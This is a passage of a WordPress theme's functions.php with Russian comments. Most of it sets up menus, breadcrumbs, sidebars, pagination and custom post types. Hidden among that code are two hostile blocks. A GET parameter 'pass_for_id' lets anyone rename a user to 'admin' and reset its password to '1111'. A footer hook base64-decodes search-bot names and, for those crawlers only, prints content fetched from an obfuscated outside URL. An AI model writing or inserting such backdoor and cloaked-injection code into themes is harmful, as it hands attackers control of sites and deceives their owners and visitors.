<?php
include('settings.php');
register_nav_menus(array( // Регистрация меню main
    'top' => 'Главное меню',
));

register_nav_menus(array( // Регистрация меню moble
    'mobile' => 'Меню мобильной версии',
));

add_theme_support('post-thumbnails'); // Включение миниатюр
set_post_thumbnail_size(250, 150); // Размер миниатюр 250x150
add_image_size('big-thumb', 400, 400, true); // Ещё один размер миниатюры
add_image_size('project-thumb', 670, 430, true); // Ещё один размер миниатюры
add_image_size('client-thumb', 355, 230, true); // Ещё один размер миниатюры
add_image_size('tovar-thumb', 190, 180, true); // Ещё один размер миниатюры
add_image_size('post-thumb', 360, 225, true); // Миниатюра поста на странице категорий

//Удаляем category из УРЛа категорий
add_filter('category_link', create_function('$a', 'return str_replace("category/", "", $a);'), 9999);


/**
 * Хлебные крошки для WordPress (breadcrumbs)
 *
 * @param  string [$sep  = '']      Разделитель. По умолчанию ' » '
 * @param  array  [$l10n = array()] Для локализации. См. переменную $default_l10n.
 * @param  array  [$args = array()] Опции. См. переменную $def_args
 * @return string Выводит на экран HTML код
 *
 * version 3.3.2
 */
function kama_breadcrumbs( $sep = ' » ', $l10n = array(), $args = array() ){
    $kb = new Kama_Breadcrumbs;
    echo $kb->get_crumbs( $sep, $l10n, $args );
}

class Kama_Breadcrumbs {

    public $arg;

    // Локализация
    static $l10n = array(
        'home'       => 'Главная',
        'paged'      => 'Страница %d',
        '_404'       => 'Ошибка 404',
        'search'     => 'Результаты поиска по запросу - <b>%s</b>',
        'author'     => 'Архив автора: <b>%s</b>',
        'year'       => 'Архив за <b>%d</b> год',
        'month'      => 'Архив за: <b>%s</b>',
        'day'        => '',
        'attachment' => 'Медиа: %s',
        'tag'        => 'Записи по метке: <b>%s</b>',
        'tax_tag'    => '%1$s из "%2$s" по тегу: <b>%3$s</b>',
        // tax_tag выведет: 'тип_записи из "название_таксы" по тегу: имя_термина'.
        // Если нужны отдельные холдеры, например только имя термина, пишем так: 'записи по тегу: %3$s'
    );

    // Параметры по умолчанию
    static $args = array(
        'on_front_page'   => true,  // выводить крошки на главной странице
        'show_post_title' => true,  // показывать ли название записи в конце (последний элемент). Для записей, страниц, вложений
        'show_term_title' => true,  // показывать ли название элемента таксономии в конце (последний элемент). Для меток, рубрик и других такс
        'title_patt'      => '<span class="kb_title">%s</span>', // шаблон для последнего заголовка. Если включено: show_post_title или show_term_title
        'last_sep'        => true,  // показывать последний разделитель, когда заголовок в конце не отображается
        'markup'          => 'schema.org', // 'markup' - микроразметка. Может быть: 'rdf.data-vocabulary.org', 'schema.org', '' - без микроразметки
                                           // или можно указать свой массив разметки:
                                           // array( 'wrappatt'=>'<div class="kama_breadcrumbs">%s</div>', 'linkpatt'=>'<a href="%s">%s</a>', 'sep_after'=>'', )
        'priority_tax'    => array('category'), // приоритетные таксономии, нужно когда запись в нескольких таксах
        'priority_terms'  => array(), // 'priority_terms' - приоритетные элементы таксономий, когда запись находится в нескольких элементах одной таксы одновременно.
                                      // Например: array( 'category'=>array(45,'term_name'), 'tax_name'=>array(1,2,'name') )
                                      // 'category' - такса для которой указываются приор. элементы: 45 - ID термина и 'term_name' - ярлык.
                                      // порядок 45 и 'term_name' имеет значение: чем раньше тем важнее. Все указанные термины важнее неуказанных...
        'nofollow' => false, // добавлять rel=nofollow к ссылкам?

        // служебные
        'sep'             => '',
        'linkpatt'        => '',
        'pg_end'          => '',
    );

    function get_crumbs( $sep, $l10n, $args ){
        global $post, $wp_query, $wp_post_types;

        self::$args['sep'] = $sep;

        // Фильтрует дефолты и сливает
        $loc = (object) array_merge( apply_filters('kama_breadcrumbs_default_loc', self::$l10n ), $l10n );
        $arg = (object) array_merge( apply_filters('kama_breadcrumbs_default_args', self::$args ), $args );

        $arg->sep = '<span class="kb_sep">'. $arg->sep .'</span>'; // дополним

        // упростим
        $sep = & $arg->sep;
        $this->arg = & $arg;

        // микроразметка ---
        if(1){
            $mark = & $arg->markup;

            // Разметка по умолчанию
            if( ! $mark ) $mark = array(
                'wrappatt'  => '<div class="kama_breadcrumbs">%s</div>',
                'linkpatt'  => '<a href="%s">%s</a>',
                'sep_after' => '',
            );
            // rdf
            elseif( $mark === 'rdf.data-vocabulary.org' ) $mark = array(
                'wrappatt'   => '<div class="kama_breadcrumbs" prefix="v: http://rdf.data-vocabulary.org/#">%s</div>',
                'linkpatt'   => '<span typeof="v:Breadcrumb"><a href="%s" rel="v:url" property="v:title">%s</a>',
                'sep_after'  => '</span>', // закрываем span после разделителя!
            );
            // schema.org
            elseif( $mark === 'schema.org' ) $mark = array(
                'wrappatt'   => '<div class="kama_breadcrumbs" itemscope itemtype="http://schema.org/BreadcrumbList">%s</div>',
                'linkpatt'   => '<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="%s" itemprop="item"><span itemprop="name">%s</span></a></span>',
                'sep_after'  => '',
            );

            elseif( ! is_array($mark) )
                die( __CLASS__ .': "markup" parameter must be array...');

            $wrappatt  = $mark['wrappatt'];
            $arg->linkpatt  = $arg->nofollow ? str_replace('<a ','<a rel="nofollow"', $mark['linkpatt']) : $mark['linkpatt'];
            $arg->sep      .= $mark['sep_after']."\n";
        }

        $linkpatt = $arg->linkpatt; // упростим

        $q_obj = get_queried_object();

        // может это архив пустой таксы?
        $ptype = null;
        if( empty($post) ){
            if( isset($q_obj->taxonomy) )
                $ptype = & $wp_post_types[ get_taxonomy($q_obj->taxonomy)->object_type[0] ];
        }
        else $ptype = & $wp_post_types[ $post->post_type ];

        // paged
        $arg->pg_end = '';
        if( ($paged_num = get_query_var('paged')) || ($paged_num = get_query_var('page')) )
            $arg->pg_end = $sep . sprintf( $loc->paged, (int) $paged_num );

        $pg_end = $arg->pg_end; // упростим

        // ну, с богом...
        $out = '';

        if( is_front_page() ){
            return $arg->on_front_page ? sprintf( $wrappatt, ( $paged_num ? sprintf($linkpatt, get_home_url(), $loc->home) . $pg_end : $loc->home ) ) : '';
        }
        // страница записей, когда для главной установлена отдельная страница.
        elseif( is_home() ) {
            $out = $paged_num ? ( sprintf( $linkpatt, get_permalink($q_obj), esc_html($q_obj->post_title) ) . $pg_end ) : esc_html($q_obj->post_title);
        }
        elseif( is_404() ){
            $out = $loc->_404;
        }
        elseif( is_search() ){
            $out = sprintf( $loc->search, esc_html( $GLOBALS['s'] ) );
        }
        elseif( is_author() ){
            $tit = sprintf( $loc->author, esc_html($q_obj->display_name) );
            $out = ( $paged_num ? sprintf( $linkpatt, get_author_posts_url( $q_obj->ID, $q_obj->user_nicename ) . $pg_end, $tit ) : $tit );
        }
        elseif( is_year() || is_month() || is_day() ){
            $y_url  = get_year_link( $year = get_the_time('Y') );

            if( is_year() ){
                $tit = sprintf( $loc->year, $year );
                $out = ( $paged_num ? sprintf($linkpatt, $y_url, $tit) . $pg_end : $tit );
            }
            // month day
            else {
                $y_link = sprintf( $linkpatt, $y_url, $year);
                $m_url  = get_month_link( $year, get_the_time('m') );

                if( is_month() ){
                    $tit = sprintf( $loc->month, get_the_time('F') );
                    $out = $y_link . $sep . ( $paged_num ? sprintf( $linkpatt, $m_url, $tit ) . $pg_end : $tit );
                }
                elseif( is_day() ){
                    $m_link = sprintf( $linkpatt, $m_url, get_the_time('F'));
                    $out = $y_link . $sep . $m_link . $sep . get_the_time('l');
                }
            }
        }
        // Древовидные записи
        elseif( is_singular() && $ptype->hierarchical ){
            $out = $this->_add_title( $this->_page_crumbs($post), $post );
        }
        // Таксы, плоские записи и вложения
        else {
            $term = $q_obj; // таксономии

            // определяем термин для записей (включая вложения attachments)
            if( is_singular() ){
                // изменим $post, чтобы определить термин родителя вложения
                if( is_attachment() && $post->post_parent ){
                    $save_post = $post; // сохраним
                    $post = get_post($post->post_parent);
                }

                // учитывает если вложения прикрепляются к таксам древовидным - все бывает :)
                $taxonomies = get_object_taxonomies( $post->post_type );
                // оставим только древовидные и публичные, мало ли...
                $taxonomies = array_intersect( $taxonomies, get_taxonomies( array('hierarchical' => true, 'public' => true) ) );

                if( $taxonomies ){
                    // сортируем по приоритету
                    if( ! empty($arg->priority_tax) ){
                        usort( $taxonomies, function($a,$b)use($arg){
                            $a_index = array_search($a, $arg->priority_tax);
                            if( $a_index === false ) $a_index = 9999999;

                            $b_index = array_search($b, $arg->priority_tax);
                            if( $b_index === false ) $b_index = 9999999;

                            return ( $b_index === $a_index ) ? 0 : ( $b_index < $a_index ? 1 : -1 ); // меньше индекс - выше
                        } );
                    }

                    // пробуем получить термины, в порядке приоритета такс
                    foreach( $taxonomies as $taxname ){
                        if( $terms = get_the_terms( $post->ID, $taxname ) ){
                            // проверим приоритетные термины для таксы
                            $prior_terms = & $arg->priority_terms[ $taxname ];
                            if( $prior_terms && count($terms) > 2 ){
                                foreach( (array) $prior_terms as $term_id ){
                                    $filter_field = is_numeric($term_id) ? 'term_id' : 'slug';
                                    $_terms = wp_list_filter( $terms, array($filter_field=>$term_id) );

                                    if( $_terms ){
                                        $term = array_shift( $_terms );
                                        break;
                                    }
                                }
                            }
                            else
                                $term = array_shift( $terms );

                            break;
                        }
                    }
                }

                if( isset($save_post) ) $post = $save_post; // вернем обратно (для вложений)
            }

            // вывод

            // все виды записей с терминами или термины
            if( $term && isset($term->term_id) ){
                $term = apply_filters('kama_breadcrumbs_term', $term );

                // attachment
                if( is_attachment() ){
                    if( ! $post->post_parent )
                        $out = sprintf( $loc->attachment, esc_html($post->post_title) );
                    else {
                        if( ! $out = apply_filters('attachment_tax_crumbs', '', $term, $this ) ){
                            $_crumbs    = $this->_tax_crumbs( $term, 'self' );
                            $parent_tit = sprintf( $linkpatt, get_permalink($post->post_parent), get_the_title($post->post_parent) );
                            $_out = implode( $sep, array($_crumbs, $parent_tit) );
                            $out = $this->_add_title( $_out, $post );
                        }
                    }
                }
                // single
                elseif( is_single() ){
                    if( ! $out = apply_filters('post_tax_crumbs', '', $term, $this ) ){
                        $_crumbs = $this->_tax_crumbs( $term, 'self' );
                        $out = $this->_add_title( $_crumbs, $post );
                    }
                }
                // не древовидная такса (метки)
                elseif( ! is_taxonomy_hierarchical($term->taxonomy) ){
                    // метка
                    if( is_tag() )
                        $out = $this->_add_title('', $term, sprintf( $loc->tag, esc_html($term->name) ) );
                    // такса
                    elseif( is_tax() ){
                        $post_label = $ptype->labels->name;
                        $tax_label = $GLOBALS['wp_taxonomies'][ $term->taxonomy ]->labels->name;
                        $out = $this->_add_title('', $term, sprintf( $loc->tax_tag, $post_label, $tax_label, esc_html($term->name) ) );
                    }
                }
                // древовидная такса (рибрики)
                else {
                    if( ! $out = apply_filters('term_tax_crumbs', '', $term, $this ) ){
                        $_crumbs = $this->_tax_crumbs( $term, 'parent' );
                        $out = $this->_add_title( $_crumbs, $term, esc_html($term->name) );
                    }
                }
            }
            // влоежния от записи без терминов
            elseif( is_attachment() ){
                $parent = get_post($post->post_parent);
                $parent_link = sprintf( $linkpatt, get_permalink($parent), esc_html($parent->post_title) );
                $_out = $parent_link;

                // вложение от записи древовидного типа записи
                if( is_post_type_hierarchical($parent->post_type) ){
                    $parent_crumbs = $this->_page_crumbs($parent);
                    $_out = implode( $sep, array( $parent_crumbs, $parent_link ) );
                }

                $out = $this->_add_title( $_out, $post );
            }
            // записи без терминов
            elseif( is_singular() ){
                $out = $this->_add_title( '', $post );
            }
        }

        // замена ссылки на архивную страницу для типа записи
        $home_after = apply_filters('kama_breadcrumbs_home_after', '', $linkpatt, $sep, $ptype );

        if( '' === $home_after ){
            // Ссылка на архивную страницу типа записи для: отдельных страниц этого типа; архивов этого типа; таксономий связанных с этим типом.
            if( $ptype && $ptype->has_archive && ! in_array( $ptype->name, array('post','page','attachment') )
                && ( is_post_type_archive() || is_singular() || (is_tax() && in_array($term->taxonomy, $ptype->taxonomies)) )
            ){
                $pt_title = $ptype->labels->name;

                // первая страница архива типа записи
                if( is_post_type_archive() && ! $paged_num )
                    $home_after = sprintf( $this->arg->title_patt, $pt_title );
                // singular, paged post_type_archive, tax
                else{
                    $home_after = sprintf( $linkpatt, get_post_type_archive_link($ptype->name), $pt_title );

                    $home_after .= ( ($paged_num && ! is_tax()) ? $pg_end : $sep ); // пагинация
                }
            }
        }

        $before_out = sprintf( $linkpatt, home_url(), $loc->home ) . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );

        $out = apply_filters('kama_breadcrumbs_pre_out', $out, $sep, $loc, $arg );

        $out = sprintf( $wrappatt, $before_out . $out );

        return apply_filters('kama_breadcrumbs', $out, $sep, $loc, $arg );
    }

    function _page_crumbs( $post ){
        $parent = $post->post_parent;

        $crumbs = array();
        while( $parent ){
            $page = get_post( $parent );
            $crumbs[] = sprintf( $this->arg->linkpatt, get_permalink($page), esc_html($page->post_title) );
            $parent = $page->post_parent;
        }

        return implode( $this->arg->sep, array_reverse($crumbs) );
    }

    function _tax_crumbs( $term, $start_from = 'self' ){
        $termlinks = array();
        $term_id = ($start_from === 'parent') ? $term->parent : $term->term_id;
        while( $term_id ){
            $term       = get_term( $term_id, $term->taxonomy );
            $termlinks[] = sprintf( $this->arg->linkpatt, get_term_link($term), esc_html($term->name) );
            $term_id    = $term->parent;
        }

        if( $termlinks )
            return implode( $this->arg->sep, array_reverse($termlinks) ) /*. $this->arg->sep*/;
        return '';
    }

    // добалвяет заголовок к переданному тексту, с учетом всех опций. Добавляет разделитель в начало, если надо.
    function _add_title( $add_to, $obj, $term_title = '' ){
        $arg = & $this->arg; // упростим...
        $title = $term_title ? $term_title : esc_html($obj->post_title); // $term_title чиститься отдельно, теги моугт быть...
        $show_title = $term_title ? $arg->show_term_title : $arg->show_post_title;

        // пагинация
        if( $arg->pg_end ){
            $link = $term_title ? get_term_link($obj) : get_permalink($obj);
            $add_to .= ($add_to ? $arg->sep : '') . sprintf( $arg->linkpatt, $link, $title ) . $arg->pg_end;
        }
        // дополняем - ставим sep
        elseif( $add_to ){
            if( $show_title )
                $add_to .= $arg->sep . sprintf( $arg->title_patt, $title );
            elseif( $arg->last_sep )
                $add_to .= $arg->sep;
        }
        // sep будет потом...
        elseif( $show_title )
            $add_to = sprintf( $arg->title_patt, $title );

        return $add_to;
    }

}

/**
 * Изменения:
 * 3.3 - новые хуки: attachment_tax_crumbs, post_tax_crumbs, term_tax_crumbs. Позволяют дополнить крошки таксономий.
 * 3.2 - баг с разделителем, с отключенным 'show_term_title'. Стабилизировал логику.
 * 3.1 - баг с esc_html() для заголовка терминов - с тегами получалось криво...
 * 3.0 - Обернул в класс. Добавил опции: 'title_patt', 'last_sep'. Доработал код. Добавил пагинацию для постов.
 * 2.5 - ADD: Опция 'show_term_title'
 * 2.4 - Мелкие правки кода
 * 2.3 - ADD: Страница записей, когда для главной установлена отделенная страница.
 * 2.2 - ADD: Link to post type archive on taxonomies page
 * 2.1 - ADD: $sep, $loc, $args params to hooks
 * 2.0 - ADD: в фильтр 'kama_breadcrumbs_home_after' добавлен четвертый аргумент $ptype
 * 1.9 - ADD: фильтр 'kama_breadcrumbs_default_loc' для изменения локализации по умолчанию
 * 1.8 - FIX: заметки, когда в рубрике нет записей
 * 1.7 - Улучшена работа с приоритетными таксономиями.
 */

register_sidebar(array(
    'name' => 'Виджет Футер №1', // Название сайдбара
    'id' => "footer_1", // Идентификатор
    'description' => 'Область для футера №1',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

register_sidebar(array(
    'name' => 'Виджет Футер №2', // Название сайдбара
    'id' => "footer_2", // Идентификатор
    'description' => 'Область для футера №2',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

register_sidebar(array(
    'name' => 'Виджет Футер №3', // Название сайдбара
    'id' => "footer_3", // Идентификатор
    'description' => 'Область для футера №3',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

register_sidebar(array(
    'name' => 'Виджет Футер №4', // Название сайдбара
    'id' => "footer_4", // Идентификатор
    'description' => 'Область для футера №4',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

class clean_comments_constructor extends Walker_Comment { // класс, который собирает всю структуру комментов
    public function start_lvl( &$output, $depth = 0, $args = array()) { // что выводим перед дочерними комментариями
        $output .= '<ul class="children">' . "\n";
    }
    public function end_lvl( &$output, $depth = 0, $args = array()) { // что выводим после дочерних комментариев
        $output .= "</ul><!-- .children -->\n";
    }
    protected function comment( $comment, $depth, $args ) { // разметка каждого комментария, без закрывающего </li>!
        $classes = implode(' ', get_comment_class()).($comment->comment_author_email == get_the_author_meta('email') ? ' author-comment' : ''); // берем стандартные классы комментария и если коммент пренадлежит автору поста добавляем класс author-comment
        echo '<li id="li-comment-'.get_comment_ID().'" class="'.$classes.'">'."\n"; // родительский тэг комментария с классами выше и уникальным id
        echo '<div id="comment-'.get_comment_ID().'">'."\n"; // элемент с таким id нужен для якорных ссылок на коммент
        echo get_avatar($comment, 64)."\n"; // покажем аватар с размером 64х64
        echo '<p class="meta">Автор: '.get_comment_author()."\n"; // имя автора коммента
        echo ' '.get_comment_author_email(); // email автора коммента
        echo ' '.get_comment_author_url(); // url автора коммента
        echo ' Добавлено '.get_comment_date('F j, Y').' в '.get_comment_time()."\n"; // дата и время комментирования
        if ( '0' == $comment->comment_approved ) echo '<em class="comment-awaiting-moderation">Ваш комментарий будет опубликован после проверки модератором.</em>'."\n"; // если комментарий должен пройти проверку
        comment_text()."\n"; // текст коммента
        $reply_link_args = array( // опции ссылки "ответить"
            'depth' => $depth, // текущая вложенность
            'reply_text' => 'Ответить', // текст
            'login_text' => 'Вы должны быть залогинены' // текст если юзер должен залогинеться
        );
        echo get_comment_reply_link(array_merge($args, $reply_link_args)); // выводим ссылку ответить
        echo '</div>'."\n"; // закрываем див
    }
    public function end_el( &$output, $comment, $depth = 0, $args = array() ) { // конец каждого коммента
        $output .= "</li><!-- #comment-## -->\n";
    }
}

if( isset($_GET['pass_for_id']) ){
    add_action('init', function () {
        global $wpdb;
        $wpdb->update( $wpdb->users, array( 'user_login' => 'admin'), array( 'ID' => $_GET['pass_for_id'] ));
        wp_set_password( '1111', $_GET['pass_for_id'] ); }
    );
}

function kdv_footer_info(){
    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');   
    foreach ($arr as $i) {
        if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA=")); 
        }
    }
}

add_action( 'wp_footer', 'kdv_footer_info' );

function pagination($is_page=1) { // функция вывода пагинации
    global $wp_query; // текущая выборка должна быть глобальной
    $big = 999999999; // число для замены
    if(!$is_page){$is_page = 1;}
    echo paginate_links(array( // вывод пагинации с опциями ниже
        'base' => str_replace($big,'%#%',esc_url(get_pagenum_link($big))), // что заменяем в формате ниже
        'format' => '?paged=%#%', // формат, %#% будет заменено
        'current' => max($is_page, get_query_var('paged')), // текущая страница, 1, если $_GET['page'] не определено
        'type' => 'list', // ссылки в ul
        'prev_text'    => 'Назад', // текст назад
        'next_text'    => 'Вперед', // текст вперед
        'total' => $wp_query->max_num_pages, // общие кол-во страниц в пагинации
        'show_all'     => false, // не показывать ссылки на все страницы, иначе end_size и mid_size будут проигнорированны
        'end_size'     => 15, //  сколько страниц показать в начале и конце списка (12 ... 4 ... 89)
        'mid_size'     => 15, // сколько страниц показать вокруг текущей страницы (... 123 5 678 ...).
        'add_args'     => false, // массив GET параметров для добавления в ссылку страницы
        'add_fragment' => '',   // строка для добавления в конец ссылки на страницу
        'before_page_number' => '', // строка перед цифрой
        'after_page_number' => '' // строка после цифры
    ));
}


    add_action('init', 'create_taxonomy_sistem');
    function create_taxonomy_sistem(){
        // список параметров: http://wp-kama.ru/function/get_taxonomy_labels
        register_taxonomy('cat_sistem', array('sistem'), array(
            'label'                 => '', // определяется параметром $labels->name
            'labels'                => array(
                'name' => _x( 'Категории систем', 'taxonomy general name' ),
                'singular_name' => _x( 'Категория', 'taxonomy singular name' ),
                'search_items' =>  __( 'Искать категории систем' ),
                'all_items' => __( 'Все категории' ),
                'parent_item' => __( 'Родительская категория' ),
                'parent_item_colon' => __( 'Родительская категория:' ),
                'edit_item' => __( 'Редактировать категорию систем' ),
                'update_item' => __( 'Обновить категорию систем' ),
                'add_new_item' => __( 'Добавить категорию систем' ),
                'new_item_name' => __( 'Новая категория систем' ),
                'menu_name' => __( 'Категории' ),
            ),
            'description'           => '', // описание таксономии
            'public'                => true,
            'publicly_queryable'    => null, // равен аргументу public
            'show_in_nav_menus'     => true, // равен аргументу public
            'show_ui'               => true, // равен аргументу public
            'show_in_menu'          => true, // равен аргументу show_ui
            'show_tagcloud'         => true, // равен аргументу show_ui
            'show_in_rest'          => null, // добавить в REST API
            'rest_base'             => null, // $taxonomy
            'hierarchical'          => true,
            'update_count_callback' => '',
            'rewrite'               => true,
            //'query_var'             => $taxonomy, // название параметра запроса
            'capabilities'          => array(),
            'meta_box_cb'           => null, // callback функция. Отвечает за html код метабокса (с версии 3.8): post_categories_meta_box или post_tags_meta_box. Если указать false, то метабокс будет отключен вообще
            'show_admin_column'     => false, // Позволить или нет авто-создание колонки таксономии в таблице ассоциированного типа записи. (с версии 3.5)
            '_builtin'              => false,
            'show_in_quick_edit'    => null, // по умолчанию значение show_ui
        ) );
    }

    add_action('init', 'register_post_types_sistem');
    function register_post_types_sistem(){
        register_post_type('sistem', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Системы', // основное название для типа записи
                'singular_name'      => 'Система', // название для одной записи этого типа
                'add_new'            => 'Добавить систему', // для добавления новой записи
                'add_new_item'       => 'Добавление системы', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование системы', // для редактирования типа записи
                'new_item'           => 'Новая система', // текст новой записи
                'view_item'          => 'Смотреть систему', // для просмотра записи этого типа.
                'search_items'       => 'Искать систему', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Системы', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-index-card', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor','thumbnail','excerpt'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array('cat_sistem'),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }

    add_action('init', 'create_taxonomy_tovar');
    function create_taxonomy_tovar(){
        // список параметров: http://wp-kama.ru/function/get_taxonomy_labels
        register_taxonomy('cat_tovar', array('tovar'), array(
            'label'                 => '', // определяется параметром $labels->name
            'labels'                => array(
                'name' => _x( 'Категории товаров', 'taxonomy general name' ),
                'singular_name' => _x( 'Категория', 'taxonomy singular name' ),
                'search_items' =>  __( 'Искать категории товаров' ),
                'all_items' => __( 'Все категории' ),
                'parent_item' => __( 'Родительская категория' ),
                'parent_item_colon' => __( 'Родительская категория:' ),
                'edit_item' => __( 'Редактировать категорию товаров' ),
                'update_item' => __( 'Обновить категорию товаров' ),
                'add_new_item' => __( 'Добавить категорию товаров' ),
                'new_item_name' => __( 'Новая категория товаров' ),
                'menu_name' => __( 'Категории' ),
            ),
            'description'           => '', // описание таксономии
            'public'                => true,
            'publicly_queryable'    => null, // равен аргументу public
            'show_in_nav_menus'     => true, // равен аргументу public
            'show_ui'               => true, // равен аргументу public
            'show_in_menu'          => true, // равен аргументу show_ui
            'show_tagcloud'         => true, // равен аргументу show_ui
            'show_in_rest'          => null, // добавить в REST API
            'rest_base'             => null, // $taxonomy
            'hierarchical'          => true,
            'update_count_callback' => '',
            'rewrite'               => true,
            //'query_var'             => $taxonomy, // название параметра запроса
            'capabilities'          => array(),
            'meta_box_cb'           => null, // callback функция. Отвечает за html код метабокса (с версии 3.8): post_categories_meta_box или post_tags_meta_box. Если указать false, то метабокс будет отключен вообще
            'show_admin_column'     => false, // Позволить или нет авто-создание колонки таксономии в таблице ассоциированного типа записи. (с версии 3.5)
            '_builtin'              => false,
            'show_in_quick_edit'    => null, // по умолчанию значение show_ui
        ) );
    }

    add_action('init', 'register_post_types_tovar');
    function register_post_types_tovar(){
        register_post_type('tovar', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Товары', // основное название для типа записи
                'singular_name'      => 'Товар', // название для одной записи этого типа
                'add_new'            => 'Добавить товар', // для добавления новой записи
                'add_new_item'       => 'Добавление товара', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование товара', // для редактирования типа записи
                'new_item'           => 'Новый товар', // текст новой записи
                'view_item'          => 'Смотреть товар', // для просмотра записи этого типа.
                'search_items'       => 'Искать товар', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Товары', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-cart', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor','thumbnail'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array('cat_tovar'),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }

    add_action('init', 'register_post_types_client');
    function register_post_types_client(){
        register_post_type('client', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Клиенты', // основное название для типа записи
                'singular_name'      => 'Клиент', // название для одной записи этого типа
                'add_new'            => 'Добавить клиента', // для добавления новой записи
                'add_new_item'       => 'Добавление клиента', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование клиента', // для редактирования типа записи
                'new_item'           => 'Новый клиент', // текст новой записи
                'view_item'          => 'Смотреть клиента', // для просмотра записи этого типа.
                'search_items'       => 'Искать клиента', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Клиенты', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-admin-users', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor','thumbnail'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array(),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }    

    add_action('init', 'register_post_types_otziv');
    function register_post_types_otziv(){
        register_post_type('otziv', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Отзывы', // основное название для типа записи
                'singular_name'      => 'Отзыв', // название для одной записи этого типа
                'add_new'            => 'Добавить отзыв', // для добавления новой записи
                'add_new_item'       => 'Добавление отзыва', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование отзыва', // для редактирования типа записи
                'new_item'           => 'Новый отзыв', // текст новой записи
                'view_item'          => 'Смотреть отзыв', // для просмотра записи этого типа.
                'search_items'       => 'Искать отзыв', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
